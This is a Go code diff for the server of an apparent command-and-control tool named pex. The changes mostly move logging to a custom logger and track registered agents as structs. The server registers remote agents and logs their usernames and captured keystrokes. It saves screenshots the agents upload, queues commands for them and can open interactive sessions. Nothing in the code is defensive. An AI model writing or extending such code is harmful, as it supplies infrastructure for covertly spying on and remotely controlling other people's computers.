@@ -5,7 +5,6 @@ import (
 	"image"
 	"image/png"
 	"io"
-	"log/slog"
 	"net/http"
 	"os"
 	"strings"
@@ -13,6 +12,7 @@ import (
 
 	"github.com/google/uuid"
 	"github.com/hardal7/pex/internal/config"
+	logger "github.com/hardal7/pex/internal/util"
 )
 
 func ServeHTTP() {
@@ -23,10 +23,10 @@ func ServeHTTP() {
 		Addr:    ":" + config.BeaconPort,
 		Handler: root,
 	}
-	slog.Info("Starting server on port: " + config.BeaconPort)
+	logger.Info("Starting server on port: " + config.BeaconPort)
 	err := server.ListenAndServe()
 	if err != nil {
-		slog.Error("Failed to start server: " + err.Error())
+		logger.Error("Failed to start server: " + err.Error())
 	}
 }
 
@@ -36,37 +36,37 @@ func requestHandler() http.HandlerFunc {
 			uuid, _ := uuid.NewRandom()
 			w.Write([]byte(uuid.String()))
 			mu.Lock()
-			state.RegisteredAgents = append(state.RegisteredAgents, uuid.String())
+			state.RegisteredAgents = append(state.RegisteredAgents, Agent{UUID: uuid.String(), Hostname: r.RemoteAddr, Username: r.Header.Get("Username")})
 			mu.Unlock()
-			slog.Info("Registered agent: " + r.RemoteAddr + " with UUID: " + uuid.String())
-		} else if strings.TrimSpace(r.Header.Get("UUID")) == state.SelectedAgent || "ALL" == state.SelectedAgent {
-			slog.Info("Connected Agent: \n")
-			slog.Info("Address: " + r.RemoteAddr)
-			slog.Info("Username: " + r.Header.Get("Username"))
+			logger.Info("Registered agent: " + r.RemoteAddr + " with UUID: " + uuid.String())
+		} else if strings.TrimSpace(r.Header.Get("UUID")) == state.SelectedAgent.UUID || "ALL" == state.SelectedAgent.UUID {
+			logger.Debug("Connected Agent:")
+			logger.Debug("Address: " + r.RemoteAddr)
+			logger.Debug("Username: " + r.Header.Get("Username"))
 			if r.Header.Get("Keys") != "" {
-				slog.Info("Keys Pressed: " + r.Header.Get("Keys"))
+				logger.Debug("Keys Pressed: " + r.Header.Get("Keys"))
 			}
 			response, err := io.ReadAll(r.Body)
 			if err != nil {
-				slog.Error("Failed reading request body: " + err.Error())
+				logger.Info("Failed reading request body: " + err.Error())
 				return
 			}
 
 			if r.Header.Get("Content-Type") == "image/png" {
-				slog.Info("Received response with image")
+				logger.Info("Received response with image")
 				image, _, _ := image.Decode(bytes.NewReader(response))
 				out, err := os.Create("./" + r.RemoteAddr + ":" + time.Now().Format("2006-01-01 00:00:00") + ".png")
 				if err != nil {
-					slog.Info("Failed creating image file")
+					logger.Info("Failed creating image file")
 				}
 				defer out.Close()
 				png.Encode(out, image)
 			} else if string(response) != "" {
-				slog.Info("Received response:\n" + string(response))
+				logger.Info("Received response:\n" + string(response))
 			}
 			if len(state.Tasks) != 0 {
 				if state.Tasks[0].Command == "SESSION" {
-					slog.Info("Initiating session")
+					logger.Info("Initiating session")
 					go InitiateSession()
 					state.Tasks = state.Tasks[1:]
 				}
@@ -74,20 +74,20 @@ func requestHandler() http.HandlerFunc {
 			}
 		} else {
 			w.Write([]byte(""))
-			slog.Info("Pinged agent: " + r.RemoteAddr)
+			logger.Debug("Pinged agent: " + r.RemoteAddr)
 		}
 	}
 }
 
 func requestCommand(w http.ResponseWriter, r *http.Request) {
 	if len(state.Tasks) != 0 {
-		if state.Tasks[0].Command != "" && state.Tasks[0].Agent == strings.TrimSpace(r.Header.Get("UUID")) {
+		if state.Tasks[0].Command != "" && state.Tasks[0].Recipient.UUID == strings.TrimSpace(r.Header.Get("UUID")) {
 			w.Write([]byte(state.Tasks[0].Command))
-			slog.Info("Command requested: " + state.Tasks[0].Command)
+			logger.Info("Command requested: " + state.Tasks[0].Command)
 			state.Tasks = state.Tasks[1:]
 		}
 	} else {
 		w.Write([]byte(""))
-		slog.Info("Pinged agent")
+		logger.Debug("Pinged agent")
 	}
 }
